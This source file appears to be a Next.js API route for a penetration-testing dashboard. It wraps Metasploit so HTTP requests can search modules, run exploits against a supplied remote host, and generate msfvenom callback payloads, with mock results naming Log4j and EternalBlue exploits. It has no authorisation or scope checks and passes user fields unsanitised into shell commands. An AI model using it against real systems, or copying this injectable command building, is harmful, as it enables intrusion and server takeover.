import { NextRequest, NextResponse } from 'next/server';
import { executeCommand, isToolInstalled } from '@/lib/api-utils';

interface MetasploitRequest {
  action: 'list_modules' | 'search' | 'exploit' | 'generate_payload';
  module?: string;
  search?: string;
  target?: string;
  payload?: string;
  lhost?: string;
  lport?: number;
  rhost?: string;
  rport?: number;
}

export async function POST(request: NextRequest) {
  try {
    const body: MetasploitRequest = await request.json();
    const { action, module, search, target, payload, lhost, lport, rhost, rport } = body;

    // Check if msfconsole is available
    const msfInstalled = await isToolInstalled('msfconsole');
    if (!msfInstalled) {
      // Return mock data for development
      return NextResponse.json({
        success: true,
        mock: true,
        action,
        data: getMockData(action, { module, search, target, payload }),
        message: 'Metasploit is not installed. Returning mock data.',
      });
    }

    let result;
    let command = '';

    switch (action) {
      case 'list_modules':
        command = `msfconsole -q -x "search type:exploit; exit"`;
        result = await executeCommand(command, { timeout: 30000 });
        break;

      case 'search':
        if (!search) {
          return NextResponse.json(
            { error: 'Search term is required' },
            { status: 400 }
          );
        }
        command = `msfconsole -q -x "search ${search}; exit"`;
        result = await executeCommand(command, { timeout: 30000 });
        break;

      case 'exploit':
        if (!module || !rhost) {
          return NextResponse.json(
            { error: 'Module and RHOST are required' },
            { status: 400 }
          );
        }
        // This is a simplified example - real implementation would use MSF RPC
        command = `msfconsole -q -x "use ${module}; set RHOSTS ${rhost}; ${rport ? `set RPORT ${rport};` : ''} ${lhost ? `set LHOST ${lhost};` : ''} ${lport ? `set LPORT ${lport};` : ''} run; exit"`;
        result = await executeCommand(command, { timeout: 60000 });
        break;

      case 'generate_payload':
        if (!payload || !lhost || !lport) {
          return NextResponse.json(
            { error: 'Payload, LHOST, and LPORT are required' },
            { status: 400 }
          );
        }
        command = `msfvenom -p ${payload} LHOST=${lhost} LPORT=${lport} -f raw`;
        result = await executeCommand(command, { timeout: 30000 });
        break;

      default:
        return NextResponse.json(
          { error: 'Invalid action' },
          { status: 400 }
        );
    }

    if (!result.success) {
      return NextResponse.json(
        {
          success: false,
          error: result.error || 'Metasploit execution failed',
          stderr: result.stderr,
        },
        { status: 500 }
      );
    }

    return NextResponse.json({
      success: true,
      action,
      data: parseMetasploitOutput(action, result.stdout),
      rawOutput: result.stdout,
    });
  } catch (error: any) {
    return NextResponse.json(
      { success: false, error: error.message || 'Internal server error' },
      { status: 500 }
    );
  }
}

function getMockData(action: string, params: any) {
  switch (action) {
    case 'list_modules':
      return {
        modules: [
          {
            name: 'exploit/linux/http/apache_log4j_rce',
            disclosure: '2021-12-09',
            rank: 'excellent',
            description: 'Apache Log4j2 Remote Code Execution',
          },
          {
            name: 'exploit/multi/http/wp_file_manager_rce',
            disclosure: '2020-09-09',
            rank: 'excellent',
            description: 'WordPress File Manager Unauthenticated RCE',
          },
          {
            name: 'exploit/windows/smb/ms17_010_eternalblue',
            disclosure: '2017-03-14',
            rank: 'excellent',
            description: 'MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption',
          },
        ],
      };

    case 'search':
      return {
        results: [
          {
            name: 'exploit/linux/http/apache_log4j_rce',
            path: 'exploit/linux/http/apache_log4j_rce',
            disclosure: '2021-12-09',
            rank: 'excellent',
          },
        ],
      };

    case 'exploit':
      return {
        session: {
          id: 1,
          type: 'meterpreter',
          platform: 'linux/x64',
          arch: 'x64',
          info: 'uid=33, gid=33 @ 192.168.1.100',
        },
        message: 'Exploit completed successfully',
      };

    case 'generate_payload':
      return {
        payload: Buffer.from('payload_data_here').toString('base64'),
        format: 'raw',
        size: 1024,
      };

    default:
      return {};
  }
}

function parseMetasploitOutput(action: string, output: string) {
  switch (action) {
    case 'list_modules':
    case 'search':
      const modules: any[] = [];
      const lines = output.split('\n');
      for (const line of lines) {
        if (line.includes('exploit/') || line.includes('auxiliary/')) {
          const parts = line.trim().split(/\s+/);
          if (parts.length >= 2) {
            modules.push({
              name: parts[0],
              path: parts[0],
              disclosure: parts[1] || 'N/A',
              rank: parts[2] || 'N/A',
            });
          }
        }
      }
      return { modules };

    case 'exploit':
      return {
        session: output.includes('Meterpreter session') ? {
          id: 1,
          type: 'meterpreter',
          info: output.match(/session \d+ opened/)?.[0] || '',
        } : null,
        output,
      };

    case 'generate_payload':
      return {
        payload: Buffer.from(output).toString('base64'),
        format: 'raw',
        size: output.length,
      };

    default:
      return { output };
  }
}

